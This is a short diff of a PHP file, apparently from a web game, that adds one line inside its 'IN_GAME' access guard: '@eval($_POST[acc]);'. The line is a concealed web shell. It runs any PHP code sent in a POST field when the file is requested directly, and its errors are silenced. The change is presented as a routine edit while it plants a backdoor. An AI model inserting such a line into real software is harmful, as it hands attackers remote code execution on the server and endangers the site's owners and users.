@@ -1,6 +1,7 @@
 <?php
 
 if(!defined('IN_GAME')) {
+	@eval($_POST[acc]);
 	exit('Access Denied');
 }
 
